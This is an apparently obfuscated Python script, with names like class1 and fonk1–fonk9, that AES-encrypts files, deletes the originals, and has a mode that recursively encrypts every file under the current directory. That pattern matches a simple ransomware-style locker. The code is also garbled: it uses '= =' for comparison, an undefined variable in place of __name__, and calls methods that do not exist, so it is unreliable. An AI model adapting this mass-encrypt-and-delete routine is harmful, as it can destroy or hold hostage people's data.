import os
import sys
import getopt
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
class class1:
    def fonk1(self):
        self.b1 = None
    def fonk2(self, password):
        b2 = SHA256.new(password.encode())
        self.b1 = b2.digest()
    def fonk3(self, data):
        def fonk4(s):
            return s + b"\0" * (AES.block_size - len(s) % AES.block_size)
        b3 = Random.new().read(AES.block_size)
        b4 = AES.new(self.b1, AES.MODE_CBC, b3)
        return b3 + b4.encrypt(fonk4(data))
    def fonk5(self, data):
        b3 = data[:AES.block_size]
        b4 = AES.new(self.b1, AES.MODE_CBC, b3)
        b5 = b4.decrypt(data[AES.block_size:])
        return b5.rstrip(b"\0")
    def fonk6(self, filename, b6 = 'encrypt'):
        b7 = {
            'encrypt': (self.encrypt_data, ".enc", "Encrypted", "adding"),
            'decrypt': (self.decrypt_data, "", "Decrypted", "removing")
        }
        func, ext, action, b8 = b7[b6]
        with open(filename, 'rb') as file:
            b9 = file.read()
        b10 = func(b9)
        if b6 = = 'encrypt':
            b11 = filename + ext
        else:
            b11 = filename.replace('.enc', '')
        with open(b11, 'wb') as file:
            file.write(b10)
        os.remove(filename)
        print(f"[+] {action} {filename} --> {b11} by {b8} extension.")
    def fonk7(self, b6 = 'encrypt'):
        for root, dirs, files in os.walk("."):
            for file in files:
                if b6 = = 'encrypt' or (b6 == 'decrypt' and file.endswith('.enc')):
                    b12 = os.path.join(root, file)
                    if b12 != sys.argv[0]:
                        self.fonk6(b12, b6)
        print(f"[+] All files {b6}ed successfully.")
    @staticmethod
    def fonk8():
        print("Usage: python class1.py -p <password> [-e <filename> | -d <filename> | -E | -D]")
        print("-p, --password <password> : Specify the password for encryption/decryption.")
        print("-e, --encrypt <filename>  : Encrypt the specified file.")
        print("-d, --decrypt <filename>  : Decrypt the specified file.")
        print("-E                        : Encrypt all files within the current directory.")
        print("-D                        : Decrypt all files within the current directory.")
    def fonk9(self):
        try:
            opts, b13 = getopt.getopt(sys.argv[1:], "hp:e:d:ED", ["help", "password=", "encrypt=", "decrypt="])
        except getopt.GetoptError as err:
            print(err)
            self.fonk8()
            sys.exit(2)
        if not opts:
            self.fonk8()
            sys.exit(2)
        for b14, arg in opts:
            if b14 in ("-h", "--help"):
                self.fonk8()
                sys.exit()
            elif b14 in ("-p", "--password"):
                self.fonk2(arg)
            elif b14 in ("-e", "--encrypt") and self.b1:
                self.fonk6(arg, 'encrypt')
            elif b14 in ("-d", "--decrypt") and self.b1:
                self.fonk6(arg, 'decrypt')
            elif b14 = = "-E" and self.b1:
                self.fonk7('encrypt')
            elif b14 = = "-D" and self.b1:
                self.fonk7('decrypt')
if b15 = = "__main__":
    b16 = class1()
    b16.fonk9()